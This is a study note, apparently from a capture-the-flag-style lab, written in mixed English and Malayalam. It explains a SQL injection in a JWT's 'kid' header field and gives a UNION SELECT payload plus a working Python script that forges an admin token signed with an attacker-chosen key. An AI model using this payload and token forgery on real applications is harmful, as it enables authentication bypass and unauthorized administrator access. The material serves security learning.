## Introduction
-->This exercise covers the exploitation of an injection in the kid element of a JWT. This injection can be used to bypass the signature mechanism
-->This course details the exploitation of a weakness in the usage of a JSON Web Token (JWT).
-->This exercise was inspired by one of the challenges during [BitcoinCTF](https://bitcoinctf.com): one of the best and most complex web Capture-The-Flag's.

## The vulnerability
-->The issue comes from one of the fields in the header: kid.
-->This parameter is available in some libraries, it's short for key identifier.
-->In this application, the kid is used without proper escaping to retrieve the key.
-->This lack of escaping could lead to multiple types of vulnerabilities:
-   SQL injections.
-   Directory traversals.
-   ...

## Exploitation
-->First, you will need to automate the testing and see what happens when you tamper with the kid value.
-->After poking for a bit, you should be able to discover what type of vulnerabilities are present in the retrieval of the key.
-->Using this, you will need to find an injection that will return a predictable result. Once you have this injection you will be able to sign your malicious JWT.
-->==A good way to get a predictable result is to get rid of the first row of the result using a random string, then adding a predictable row using UNION SELECT '1==

## Conclusion
-->This exercise showed you another way to tamper with a JWT to gain administrator access in an application.
-->It showed you that having a signed value is only as strong as the way the signature is handled.
-->Here by finding a vulnerability in the way the key was retrieved, you were able to use a weak key and bypass the signature.

# Video Explanation
## Video 1 - introduction
-->in this challenge the vulnerability is an sql injection
-->the injection will allow you to predict the value returned when the application queries the database
-->You can use a lot of exploitation methods but Union Based (union select ...) allows you to easily return the value you want ie,for example :
```
SELECT key FROM keys WHERE kid='key1'    ennakum real query
but namal ivide union select chyumbol :
SELECT key FROM keys WHERE kid='zzzzzz' UNION SELECT 'aaa'   enn kodukunu
ith query aan.code il inject chyumbol :
..."HS256","Kid":"zzzzz' UNION SELECT 'aaa"}    enn aan kodukendath ok
```
-->so ingane chyumbol namuk 'aaa'  enn sathanam koodi namuk kodukan patunu.
-->ee lab jwtIII pole thane same aan.so athinte code use chythalum mathi.athil namal kid=../../../  ingane directory traversal aan koduthath ivide nama ath maati zzzz' UNION SELECT 'aaa'  en kodutha mathi.enit key varibale il "aaa"  enn kodukuka
-->ivide union select use chythath ethengilum data retrieve chyan alla pakaram 'aaa'  ennath key aayi forge chyan aan 
-->ivide oru column mathrame ullu enna oru assumption vechan namal 'aaa'  enn koduthath.karanam kid='key1' ennanalo kanikunath.ini athava onnil kooduthal undengil 1,'aaa'  enn kodukam.athoke noki chythamathi ok
-->ivide `zzzzz`  enn namal key1 ennath matit kodukunu karanam database il zzzzzz ingane onn undakila so first query namuk onum return chyth tharila.and randamathe query namuk 'aaa' tharum.so namal ath key aaki matanam. so code il key enno mato varible aaki aaa enn namal kodukanam ie, key='aaa'

## Video - 2 - python exploitation
-->jwtIII il ninum ulla athe code thane aan ividem use chyunath :
```python
import hmac
import base64
import hashlib
import json


header = {"typ":"JWT","alg":"HS256","kid":"zzzz' UNION SELECT 'aaa"}
key = "aaa"

payload = {"user":"admin"}

str = base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding='utf8')).decode('utf8').rstrip("=")
sig = base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='utf8'),str.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip("=")
print(str+"."+sig)
```
-->jwtIII il ninum edutha code il aake rand changes njan chytholu ie, "kid":"zzzz' UNION SELECT 'aaa"  enn koduthathum athupole key = "aaa"  enn koduthathum
-->ivide kid paramter il sherikum key1 ennan undayirunath .namal ath mati zzz enn kodukunu karnaam database il zzzz ila so first query onnum return chyila so randamathe query ini application run chyum.athil 'aaa'  enna string und.so namuk aa 'aaa' enna string kid paramter point chyunathayi vekam athin namal key enna variable il "aaa"  enn koduth set chyunu.so ini code signature aakumbol aa key aan token undakumbol use chyyuka.angane namuk admin aayi maran patum ok